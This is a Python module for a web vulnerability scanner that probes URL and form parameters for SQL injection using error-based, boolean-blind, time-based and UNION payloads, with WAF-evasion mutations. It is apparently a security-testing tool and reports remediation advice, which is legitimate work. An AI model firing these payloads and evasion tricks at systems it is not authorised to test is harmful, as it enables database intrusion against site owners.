"""
SQL Injection testing module for uEWF.
Advanced SQLi detection engine with techniques used by sqlmap.
Supports: Error-based, Boolean-blind, Time-blind, UNION, and Heuristic detection.
"""

import re
import time
import random
import string
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup

from ..core.modules import BaseModule, ModuleManager
from ..core.safeties import SafetyManager
from ..core.logger import get_logger
from ..utils.payloads import PayloadManager

logger = get_logger(__name__)


class SQLiTester(BaseModule):
    """Advanced SQL Injection vulnerability tester."""
    
    name = "sqli"
    description = "Advanced SQL Injection detection (sqlmap-competitive)"
    version = "2.0.0"
    author = "Prince Kumarr"
    enabled = True
    techniques = [
        "Heuristic Detection",
        "Error-based SQL Injection",
        "Boolean-based Blind (AND/OR)",
        "Time-based Blind SQL Injection",
        "UNION-based SQL Injection",
        "Parameter Replace Injection",
        "Stacked Queries",
        "WAF Bypass Techniques"
    ]
    
    # Comprehensive error patterns for SQL injection detection
    ERROR_PATTERNS = [
        # MySQL / MariaDB
        r"SQL syntax.*MySQL",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"Unknown column '[^']+' in 'field list'",
        r"Table '[^']+' doesn't exist",
        r"Column count doesn't match value count",
        r"Duplicate entry '[^']+' for key",
        r"MySQL server version for the right syntax",
        r"mysql_fetch_array",
        r"mysql_fetch_assoc",
        r"mysql_fetch_row",
        r"mysql_num_rows",
        r"mysql_result",
        r"mysql_query",
        r"mysql_error",
        r"mysql_connect",
        r"mysqli_error",
        r"mysqli_query",
        r"mysqli_connect",
        r"mysqli_fetch_array",
        r"mysqli_fetch_assoc",
        r"mysqli_fetch_row",
        r"mysqli_num_rows",
        r"mysqli_result",
        r"mysqli?_.*",
        r"supplied argument is not a valid MySQL",
        r"Unknown database '[^']+'",
        r"Base table or view not found",
        
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"PG::SyntaxError:",
        r"ERROR:\s+duplicate key",
        r"ERROR:\s+syntax error at or near",
        r"pg_query",
        r"pg_exec",
        r"pg_fetch",
        r"pg_numrows",
        r"pg_num_rows",
        
        # MSSQL
        r"Unclosed quotation mark",
        r"Microsoft OLE DB Provider",
        r"Microsoft\\[\\]\\[ODBC SQL Server Driver\\]",
        r"SqlException",
        r"Incorrect syntax near",
        r"Must declare the scalar variable",
        r"Conversion failed when converting",
        
        # Oracle
        r"ORA-[0-9]{5}",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"OCI",
        
        # SQLite
        r"SQLite.Exception",
        r"SQLite3::",
        r"sqlite_",
        r"SQL logic error",
        r"no such table",
        r"no such column",
        
        # Generic / Multi-DB
        r"SQL syntax",
        r"unrecognized token",
        r"unknown database",
        r"database error",
        r"db error",
        r"odbc_",
        r"error in your SQL syntax",
        r"data type mismatch",
        r"duplicate entry",
        r"cannot insert NULL",
        r"Warning.*sql",
        r"Warning.*database",
        r"Warning.*query",
        r"Query failed",
        r"Execute failed",
        r"prepare failed",
        r"DB Error",
        r"\[You have an error in your SQL syntax",
        r"supplied argument is not a valid",
        r"Invalid query",
        r"SQL command not properly ended",
    ]
    
    # Time-based delay patterns
    TIME_PATTERNS = {
        'mysql': {
            'sleep': "SLEEP({delay})",
            'benchmark': "BENCHMARK({count},MD5('test'))",
            'heavy': "(SELECT * FROM (SELECT(SLEEP({delay})))a)",
            'rlike': "RLIKE SLEEP({delay})",
        },
        'postgresql': {
            'sleep': "PG_SLEEP({delay})",
        },
        'mssql': {
            'waitfor': "WAITFOR DELAY '0:0:{delay}'",
        },
        'oracle': {
            'sleep': "DBMS_LOCK.SLEEP({delay})",
        },
        'sqlite': {
            'heavy': "randomblob(100000000)",
        }
    }
    
    # WAF bypass comment patterns
    WAF_BYPASS_COMMENTS = [
        "/**/",
        "/*!*/",
        "/*!12345*/",
        "/*!99999*/",
        "-- ",
        "#",
        "/*",
        "*/",
        "%00",
        "/*!50000*/",
    ]
    
    def __init__(self, config: Dict = None):
        super().__init__(config)
        self.target = self.config.get('target', '')
        self.parameter = self.config.get('parameter')
        self.data = self.config.get('data')
        self.cookie = self.config.get('cookie')
        self.level = self.config.get('level', 1)
        self.risk = self.config.get('risk', 1)
        self.safe_mode = self.config.get('safe_mode', True)
        self.session = None
        self.safety = SafetyManager()
        self.payload_manager = PayloadManager()
        self.vulnerabilities = []
        
        # Connection retry config
        self.max_retries = 3
        self.retry_delay = 1.0
        
        # WAF detection state
        self.waf_detected = False
        self.waf_type = None
        
        # Stable content anchors (for boolean blind)
        self.stable_strings: List[str] = []
        self.stable_length: int = 0
    
    def test(self, url: str, parameters: List = None, method: str = 'GET', session=None) -> List[Dict]:
        """Run advanced SQL injection tests."""
        self.session = session or requests.Session()
        self.target = url.rstrip('/')
        self.vulnerabilities = []
        
        logger.info(f"Starting advanced SQLi test on {url}")
        
        # Get parameters to test
        test_params = self._get_test_parameters(url, parameters)
        
        if not test_params:
            logger.debug(f"No parameters found to test on {url}")
            return []
        
        for param_info in test_params:
            param_name = param_info['name']
            original_value = param_info.get('value', '1')
            
            if not self.safety.validate_parameter(param_name):
                continue
            
            # Step 1: Get baseline response
            baseline = self._make_request(url, {param_name: original_value}, method)
            if not baseline:
                continue
            
            baseline_text = baseline.text
            self.stable_length = len(baseline_text)
            
            # Step 2: Extract stable strings from baseline (for boolean blind anchoring)
            self._extract_stable_strings(baseline_text)
            
            # Step 3: Check for WAF
            self._check_waf_detection(baseline)
            
            # Step 4: Determine if parameter is numeric or string
            is_numeric = self._is_numeric_param(original_value)
            
            # Step 5: Heuristic detection - test if parameter triggers different behavior
            heuristic_result = self._heuristic_test(url, param_name, original_value, method, is_numeric)
            
            # Step 6: Run injection techniques
            if heuristic_result.get('injectable'):
                logger.info(f"Heuristic suggests {param_name} may be injectable")
            
            # Error-based (fastest, try first)
            if self._test_error_based(url, param_name, original_value, method, is_numeric):
                continue
            
            # Boolean-based blind with AND
            if self._test_boolean_blind_and(url, param_name, original_value, method, is_numeric):
                continue
            
            # Boolean-based blind with OR (the technique sqlmap used)
            if self._test_boolean_blind_or(url, param_name, original_value, method, is_numeric):
                continue
            
            # Parameter replace (id=-1770 OR 5466=5466# style)
            if self._test_parameter_replace(url, param_name, original_value, method, is_numeric):
                continue
            
            # Time-based blind
            if self._test_time_based(url, param_name, original_value, method, is_numeric):
                continue
            
            # UNION-based (risk >= 2)
            if self.risk >= 2:
                if self._test_union_based(url, param_name, original_value, method, is_numeric):
                    continue
        
        return self.vulnerabilities
    
    def _make_request(self, url: str, params: Dict, method: str = 'GET', raw_url: str = None) -> Optional[requests.Response]:
        """Make HTTP request with retry and connection reset handling."""
        last_error = None
        
        for attempt in range(self.max_retries):
            try:
                if raw_url:
                    response = self.session.get(raw_url, timeout=30)
                elif method.upper() == 'GET':
                    response = self.session.get(url, params=params, timeout=30)
                else:
                    response = self.session.post(url, data=params, timeout=30)
                return response
            except requests.exceptions.ConnectionError as e:
                last_error = e
                logger.debug(f"Connection reset (attempt {attempt+1}/{self.max_retries}): {e}")
                time.sleep(self.retry_delay * (attempt + 1))
            except requests.exceptions.Timeout:
                return None  # Timeout is expected for time-based tests
            except Exception as e:
                logger.debug(f"Request failed: {e}")
                return None
        
        if last_error:
            logger.debug(f"All {self.max_retries} attempts failed: {last_error}")
        return None
    
    def _extract_stable_strings(self, text: str):
        """Extract stable strings from response for boolean blind anchoring."""
        # Extract visible text content (remove HTML tags)
        text_only = re.sub(r'<[^>]+>', ' ', text)
        text_only = re.sub(r'\s+', ' ', text_only).strip()
        
        # Find words that appear to be static content
        words = text_only.split()
        # Common stable words
        stable_candidates = [w for w in words if len(w) > 4 and all(c.isalpha() for c in w)]
        
        # Take top words as stable anchors
        self.stable_strings = stable_candidates[:10]
    
    def _check_waf_detection(self, response: requests.Response):
        """Check if a WAF is detected from the response."""
        # Check for common WAF indicators
        waf_indicators = {
            'ModSecurity': ['Not Acceptable', '406', 'ModSecurity', 'mod_security'],
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'AWS WAF': ['x-amzn-RequestId', 'AWS WAF'],
        }
        
        status = response.status_code
        headers = dict(response.headers)
        text = response.text[:1000].lower()
        
        for waf_name, indicators in waf_indicators.items():
            for indicator in indicators:
                if indicator.lower() in text or indicator.lower() in str(headers).lower():
                    self.waf_detected = True
                    self.waf_type = waf_name
                    logger.info(f"WAF detected: {waf_name}")
                    return
        
        # Check for 406 status (ModSecurity)
        if status == 406:
            self.waf_detected = True
            self.waf_type = 'ModSecurity'
            logger.info("WAF detected: ModSecurity (406 Not Acceptable)")
    
    def _add_waf_bypass(self, payload: str, technique: str = 'comment') -> str:
        """Add WAF bypass techniques to payload."""
        if not self.waf_detected:
            return payload
        
        if technique == 'comment':
            # Random inline comment
            comment = random.choice(self.WAF_BYPASS_COMMENTS)
            # Inject comment into the middle of SQL keywords
            for keyword in ['OR', 'AND', 'UNION', 'SELECT', 'WHERE', 'SLEEP']:
                if keyword in payload.upper() and len(keyword) >= 2:
                    mid = len(keyword) // 2
                    payload = payload.replace(keyword, keyword[:mid] + comment + keyword[mid:], 1)
                    break
            
            # Add comment padding
            if '#' in payload:
                payload = payload.replace('#', f' #{comment}')
            elif '--' in payload:
                payload = payload.replace('--', f'--{comment}')
        
        elif technique == 'encoding':
            # URL encode some characters
            chars_to_encode = ["'", '"', ' ', '=', '(', ')']
            for c in chars_to_encode:
                if c in payload and random.random() < 0.3:
                    payload = payload.replace(c, quote(c), 1)
        
        elif technique == 'case':
            # Random case mutation
            result = []
            for c in payload:
                if c.isalpha() and random.random() < 0.3:
                    result.append(c.upper() if c.islower() else c.lower())
                else:
                    result.append(c)
            payload = ''.join(result)
        
        return payload
    
    def _heuristic_test(self, url: str, param: str, value: str, method: str, is_numeric: bool) -> Dict:
        """
        Heuristic test to check if parameter is injectable.
        Sends a benign test and checks for behavioral changes.
        """
        result = {'injectable': False, 'db_type': None}
        
        # Get baseline
        baseline = self._make_request(url, {param: value}, method)
        if not baseline:
            return result
        
        baseline_len = len(baseline.text)
        
        # Test 1: Add a benign condition that should be TRUE
        # For numeric: AND 1=1, for string: ' AND '1'='1
        if is_numeric:
            test_values = [
                (value + " AND 1=1", "AND 1=1"),
                (value + " AND 1=2", "AND 1=2"),
                (str(random.randint(1000, 9999)), "replace_random"),
            ]
        else:
            test_values = [
                (value + "' AND '1'='1", "' AND '1'='1"),
                (value + "' AND '1'='2", "' AND '1'='2"),
            ]
        
        for test_val, payload_desc in test_values:
            resp = self._make_request(url, {param: test_val}, method)
            if resp is None:
                continue
            
            resp_len = len(resp.text)
            
            # Check for SQL error indicators
            has_error = any(re.search(p, resp.text, re.IGNORECASE) for p in self.ERROR_PATTERNS)
            if has_error:
                result['injectable'] = True
                result['indicator'] = f"SQL error triggered: {payload_desc}"
                logger.info(f"Heuristic: SQL error triggered with {payload_desc}")
                break
            
            # Check for significant content change
            if abs(resp_len - baseline_len) > 30 and resp.status_code != baseline.status_code:
                result['injectable'] = True
                result['indicator'] = f"Behavioral change: {payload_desc}"
                break
        
        return result
    
    def _is_numeric_param(self, value: str) -> bool:
        """Check if a parameter value is likely numeric."""
        if not value:
            return False
        try:
            int(value)
            return True
        except ValueError:
            try:
                float(value)
                return True
            except ValueError:
                return False
    
    def _get_test_parameters(self, url: str, parameters: List) -> List[Dict]:
        """Get list of parameters to test."""
        if self.parameter:
            return [{'name': self.parameter, 'value': '1'}]
        
        if parameters:
            if isinstance(parameters[0], dict):
                valid_params = [p for p in parameters if isinstance(p, dict) and 'name' in p]
                if valid_params:
                    return valid_params
                names = [p.get('name', '') for p in parameters if isinstance(p, dict)]
                if names:
                    return [{'name': n, 'value': '1'} for n in names if n]
            elif isinstance(parameters[0], str):
                return [{'name': p, 'value': '1'} for p in parameters if isinstance(p, str)]
        
        # Parse URL parameters from query string
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            return [{'name': k, 'value': v[0] if v else '1'} for k, v in params.items()]
        
        return []
    
    def _get_baseline(self, url: str, param: str, value: str, method: str) -> Tuple[Optional[str], int]:
        """Get baseline response for comparison."""
        response = self._make_request(url, {param: value}, method)
        if response:
            return response.text, len(response.text)
        return None, 0
    
    def _report_vulnerability(self, vuln_type: str, severity: str, url: str, param: str, 
                              payload: str, evidence: str, confidence: float, remediation: str = None) -> Dict:
        """Create and report a vulnerability."""
        if not remediation:
            remediation = 'Use parameterized queries or prepared statements.'
        
        vuln = {
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'parameter': param,
            'payload': payload,
            'description': f"{vuln_type} detected in parameter '{param}'",
            'evidence': evidence,
            'remediation': remediation,
            'confidence': confidence,
            'waf_bypass': self.waf_detected,
        }
        
        # Check if we already reported this exact vuln
        for existing in self.vulnerabilities:
            if existing['url'] == url and existing['parameter'] == param and existing['type'] == vuln_type:
                return existing
        
        self.vulnerabilities.append(vuln)
        logger.warning(f"SQLi found: {param} ({vuln_type})")
        return vuln
    
    # ============ ERROR-BASED TEST ============
    
    def _test_error_based(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for error-based SQL injection with WAF bypass."""
        logger.debug(f"Testing error-based SQLi on parameter: {param}")
        
        # Build error-inducing payloads
        payloads = self._build_error_payloads(is_numeric)
        
        for payload in payloads:
            if not self.safety.validate_payload(payload, 'sqli')[0]:
                continue
            
            # Apply WAF bypass
            test_payload = self._add_waf_bypass(str(value) + payload, 'comment')
            
            params = {param: test_payload}
            response = self._make_request(url, params, method)
            if response is None:
                continue
            
            response_text = response.text
            
            # Check for error patterns
            for pattern in self.ERROR_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    self._report_vulnerability(
                        vuln_type='SQL Injection (Error-based)',
                        severity='high',
                        url=url, param=param,
                        payload=payload,
                        evidence=f"Error pattern: {pattern}",
                        confidence=0.9
                    )
                    return True
            
            # Check for server error with content change
            if response.status_code in [500, 400, 406, 403]:
                normal_resp = self._make_request(url, {param: value}, method)
                if normal_resp and normal_resp.status_code == 200:
                    has_error_keywords = any(w in response_text.lower() for w in 
                        ['error', 'warning', 'syntax', 'unexpected', 'exception', 'mysql', 'sql'])
                    if has_error_keywords:
                        self._report_vulnerability(
                            vuln_type='SQL Injection (Error-based)',
                            severity='high',
                            url=url, param=param,
                            payload=payload,
                            evidence=f"Server error {response.status_code} with error keywords",
                            confidence=0.8
                        )
                        return True
        
        return False
    
    def _build_error_payloads(self, is_numeric: bool) -> List[str]:
        """Build error-based payloads appropriate for parameter type."""
        if is_numeric:
            return [
                "'", "\"", "')", "))", "\")", "''", "\"\"",
                "`", "\\", "%00",
                "1'", "1''",
                "1 AND 1=1", "1 AND 1=2",
                "1 OR 1=1", "1 OR 1=2",
                "1 UNION SELECT 1", "1 UNION SELECT 1,2",
                "1' UNION SELECT NULL -- ",
                "1' UNION SELECT NULL,NULL -- ",
                "1 ORDER BY 1", "1 ORDER BY 100",
                "-1", "999999",
                "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))",
                "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)",
            ]
        else:
            return [
                "'", "\"", "')", "))", "\")", "''", "\"\"",
                "`", "\\", "%00",
                "' OR '1'='1", "' OR '1'='1' -- ",
                "' OR '1'='1' #", "' OR '1'='1'/*",
                "' AND '1'='1", "' AND '1'='2",
                "' UNION SELECT NULL -- ",
                "' UNION SELECT NULL,NULL -- ",
                "' AND 1=1 -- ", "' AND 1=2 -- ",
            ]
    
    # ============ BOOLEAN-BASED BLIND (AND) ============
    
    def _test_boolean_blind_and(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for AND boolean-based blind SQL injection."""
        logger.debug(f"Testing AND boolean-blind SQLi on parameter: {param}")
        
        if is_numeric:
            true_cond = " AND 1=1"
            false_cond = " AND 1=2"
        else:
            true_cond = "' AND '1'='1"
            false_cond = "' AND '1'='2"
        
        return self._compare_true_false(url, param, value, method, true_cond, false_cond, "AND boolean-blind")
    
    def _test_boolean_blind_or(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for OR boolean-based blind SQL injection (the technique sqlmap used)."""
        logger.debug(f"Testing OR boolean-blind SQLi on parameter: {param}")
        
        # For OR-based, the technique is: id=-9999 OR 1=1 (true) vs id=-9999 OR 1=2 (false)
        # This uses a negative value to force the OR clause to be the deciding factor
        
        if is_numeric:
            # Negative value + OR condition
            negative_val = str(-random.randint(1000, 9999))
            true_cond = f" OR 1=1"
            false_cond = f" OR 1=2"
        else:
            # For string params
            negative_val = "'" + str(-random.randint(1000, 9999))
            true_cond = f"' OR '1'='1"
            false_cond = f"' OR '1'='2"
        
        # Test with negative value replacement (parameter replace technique)
        neg_true = negative_val + true_cond
        neg_false = negative_val + false_cond
        
        true_resp = self._make_request(url, {param: neg_true}, method)
        false_resp = self._make_request(url, {param: neg_false}, method)
        
        if true_resp and false_resp:
            return self._analyze_boolean_difference(
                url, param, value, method,
                true_resp, false_resp,
                f"OR boolean-blind (neg replace): {neg_true} vs {neg_false}",
                confidence=0.85
            )
        
        return False
    
    def _test_parameter_replace(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for parameter replace-based injection (e.g., id=-1770 OR 5466=5466#)."""
        logger.debug(f"Testing parameter replace SQLi on parameter: {param}")
        
        # This is the exact technique sqlmap used
        # Random valid value replacement: param=-RANDOM OR RANDOM=RANDOM#
        rand1 = random.randint(1000, 9999)
        rand2 = random.randint(1000, 9999)
        rand3 = random.randint(1000, 9999)
        
        replace_payloads = [
            # OR true condition (should return results)
            f"-{rand1} OR {rand2}={rand2}",
            f"-{rand1} OR {rand2}={rand2}#",
            f"-{rand1} OR {rand2}={rand2}--",
            f"{rand1} OR {rand2}={rand2}",
            f"{rand1} OR {rand2}={rand3}",
            # AND with existing value
            f"{value} AND {rand2}={rand2}",
            f"{value} AND {rand2}={rand3}",
        ]
        
        baseline_text, baseline_len = self._get_baseline(url, param, value, method)
        if not baseline_text:
            return False
        
        for payload in replace_payloads:
            if not self.safety.validate_payload(payload, 'sqli')[0]:
                continue
            
            # Apply WAF bypass
            test_payload = self._add_waf_bypass(payload, 'comment')
            params = {param: test_payload}
            
            response = self._make_request(url, params, method)
            if response is None:
                continue
            
            resp_len = len(response.text)
            
            # Check for significant difference (OR true returned data, OR false didn't)
            if 'OR' in payload and '=' in payload:
                # Check if this looks like a true condition (returned similar to baseline)
                # vs false condition (different behavior)
                is_true = payload.split('=')[0].split()[-1] == payload.split('=')[1]
                
            # Check for error patterns
            for pattern in self.ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    self._report_vulnerability(
                        vuln_type='SQL Injection (Parameter Replace)',
                        severity='high',
                        url=url, param=param,
                        payload=payload,
                        evidence=f"Error pattern: {pattern}",
                        confidence=0.85
                    )
                    return True
        
        return False
    
    def _compare_true_false(self, url: str, param: str, value: str, method: str, 
                           true_suffix: str, false_suffix: str, technique: str) -> bool:
        """Compare true and false condition responses for boolean blind detection."""
        # Get baseline
        baseline_text, baseline_len = self._get_baseline(url, param, value, method)
        if not baseline_text:
            return False
        
        true_value = str(value) + true_suffix
        false_value = str(value) + false_suffix
        
        # Add WAF bypass
        true_value = self._add_waf_bypass(true_value, 'comment')
        false_value = self._add_waf_bypass(false_value, 'comment')
        
        true_resp = self._make_request(url, {param: true_value}, method)
        false_resp = self._make_request(url, {param: false_value}, method)
        
        if not true_resp or not false_resp:
            return False
        
        return self._analyze_boolean_difference(
            url, param, value, method,
            true_resp, false_resp,
            f"{technique}: {true_suffix} / {false_suffix}",
            confidence=0.7
        )
    
    def _analyze_boolean_difference(self, url: str, param: str, value: str, method: str,
                                    true_resp: requests.Response, false_resp: requests.Response,
                                    payload_desc: str, confidence: float = 0.7) -> bool:
        """Analyze true/false response differences for boolean blind detection."""
        true_text = true_resp.text
        false_text = false_resp.text
        
        # Get baseline
        baseline_text, baseline_len = self._get_baseline(url, param, value, method)
        
        true_len = len(true_text)
        false_len = len(false_text)
        length_diff = abs(true_len - false_len)
        
        # Check 1: Status code difference
        if true_resp.status_code == 200 and false_resp.status_code != 200:
            self._report_vulnerability(
                vuln_type='SQL Injection (Boolean Blind)',
                severity='medium',
                url=url, param=param,
                payload=payload_desc,
                evidence=f"True=200, False={false_resp.status_code}. Payload: {payload_desc[:100]}",
                confidence=confidence + 0.1
            )
            return True
        
        # Check 2: Error pattern in false but not true
        false_has_errors = any(re.search(p, false_text, re.IGNORECASE) for p in self.ERROR_PATTERNS)
        true_has_errors = any(re.search(p, true_text, re.IGNORECASE) for p in self.ERROR_PATTERNS)
        
        if false_has_errors and not true_has_errors:
            self._report_vulnerability(
                vuln_type='SQL Injection (Boolean Blind)',
                severity='medium',
                url=url, param=param,
                payload=payload_desc,
                evidence=f"False condition triggers SQL error; true condition returns normal",
                confidence=confidence + 0.1
            )
            return True
        
        # Check 3: Content length difference > threshold
        if length_diff >= 5 and length_diff < 200:
            self._report_vulnerability(
                vuln_type='SQL Injection (Boolean Blind)',
                severity='medium',
                url=url, param=param,
                payload=payload_desc,
                evidence=f"Response length difference: {length_diff} bytes",
                confidence=confidence
            )
            return True
        
        # Check 4: String anchor comparison (sqlmap-style)
        if self.stable_strings:
            true_has_stable = all(s in true_text for s in self.stable_strings[:3])
            false_has_stable = all(s in false_text for s in self.stable_strings[:3])
            
            if true_has_stable and not false_has_stable:
                self._report_vulnerability(
                    vuln_type='SQL Injection (Boolean Blind)',
                    severity='medium',
                    url=url, param=param,
                    payload=payload_desc,
                    evidence=f"Stable content present in true response but missing in false",
                    confidence=confidence + 0.05
                )
                return True
        
        # Check 5: Response content mismatch (different HTML outputs)
        if true_text != false_text and length_diff >= 10:
            self._report_vulnerability(
                vuln_type='SQL Injection (Boolean Blind)',
                severity='medium',
                url=url, param=param,
                payload=payload_desc,
                evidence=f"Content differs between true/false responses ({length_diff} bytes)",
                confidence=confidence - 0.1
            )
            return True
        
        return False
    
    # ============ TIME-BASED BLIND ============
    
    def _test_time_based(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for time-based blind SQL injection."""
        logger.debug(f"Testing time-based blind SQLi on parameter: {param}")
        
        # Use shorter delays for faster detection
        delay = 3
        
        for db_type, patterns in self.TIME_PATTERNS.items():
            for pattern_name, pattern in patterns.items():
                if '{delay}' in pattern:
                    payload = pattern.format(delay=delay)
                elif '{count}' in pattern:
                    payload = pattern.format(count=10000000)
                else:
                    payload = pattern
                
                if not self.safety.validate_payload(payload, 'sqli')[0]:
                    continue
                
                # Build injection based on parameter type
                if is_numeric:
                    inj_value = str(value) + " " + payload
                    if not payload.rstrip().endswith('--') and not payload.rstrip().endswith('#'):
                        inj_value = str(value) + " " + payload + " -- "
                else:
                    inj_value = str(value) + "' " + payload
                    if not payload.rstrip().endswith('--') and not payload.rstrip().endswith('#'):
                        inj_value = str(value) + "' " + payload + " -- "
                
                # Apply WAF bypass
                inj_value = self._add_waf_bypass(inj_value, 'comment')
                
                params = {param: inj_value}
                
                start_time = time.time()
                response = self._make_request(url, params, method)
                elapsed = time.time() - start_time
                
                if response and elapsed >= delay:
                    self._report_vulnerability(
                        vuln_type='SQL Injection (Time-based Blind)',
                        severity='critical',
                        url=url, param=param,
                        payload=payload,
                        evidence=f"Delay: {elapsed:.2f}s (expected: {delay}s). Type: {db_type}/{pattern_name}",
                        confidence=0.95,
                        remediation='Use parameterized queries.'
                    )
                    return True
        
        return False
    
    # ============ UNION-BASED ============
    
    def _test_union_based(self, url: str, param: str, value: str, method: str, is_numeric: bool = True) -> bool:
        """Test for UNION-based SQL injection."""
        logger.debug(f"Testing UNION-based SQLi on parameter: {param}")
        
        # Get baseline
        baseline_resp = self._make_request(url, {param: value}, method)
        if not baseline_resp:
            return False
        
        baseline_text = baseline_resp.text
        baseline_len = len(baseline_text)
        
        # UNION payloads for column discovery
        if is_numeric:
            templates = [
                f" UNION SELECT NULL -- ",
                f" UNION SELECT NULL,NULL -- ",
                f" UNION SELECT NULL,NULL,NULL -- ",
                f" UNION SELECT NULL,NULL,NULL,NULL -- ",
                f" UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
                f" UNION SELECT 1 -- ",
                f" UNION SELECT 1,2 -- ",
                f" UNION SELECT 1,2,3 -- ",
                f" UNION SELECT 1,2,3,4 -- ",
                f" UNION SELECT 1,2,3,4,5 -- ",
            ]
        else:
            templates = [
                f"' UNION SELECT NULL -- ",
                f"' UNION SELECT NULL,NULL -- ",
                f"' UNION SELECT NULL,NULL,NULL -- ",
                f"' UNION SELECT NULL,NULL,NULL,NULL -- ",
                f"' UNION SELECT 1 -- ",
                f"' UNION SELECT 1,2 -- ",
                f"' UNION SELECT 1,2,3 -- ",
                f"' UNION SELECT 1,2,3,4 -- ",
            ]
        
        for template in templates:
            payload = str(value) + template
            payload = self._add_waf_bypass(payload, 'comment')
            
            if not self.safety.validate_payload(payload, 'sqli')[0]:
                continue
            
            params = {param: payload}
            response = self._make_request(url, params, method)
            
            if not response:
                continue
            
            resp_len = len(response.text)
            
            # Check for changed behavior
            if response.status_code == 200:
                # Content changed meaningfully
                if abs(resp_len - baseline_len) > 30 and response.text != baseline_text:
                    # Check for marker numbers appearing standalone
                    for marker in ['1', '2', '3', '4', '5']:
                        # Look for numbers in HTML content (between tags)
                        if re.search(rf'>\s*{marker}\s*<', response.text) or \
                           re.search(rf'[^a-zA-Z]{marker}[^a-zA-Z0-9]', response.text):
                            self._report_vulnerability(
                                vuln_type='SQL Injection (UNION-based)',
                                severity='high',
                                url=url, param=param,
                                payload=template.strip(),
                                evidence=f"Content changed: {baseline_len} -> {resp_len} bytes. Marker '{marker}' found.",
                                confidence=0.85,
                                remediation='Use parameterized queries.'
                            )
                            return True
        
        return False
    
    def cleanup(self):
        """Cleanup resources."""
        if self.session:
            self.session.close()


# Register module
ModuleManager.register_module('sqli', SQLiTester)
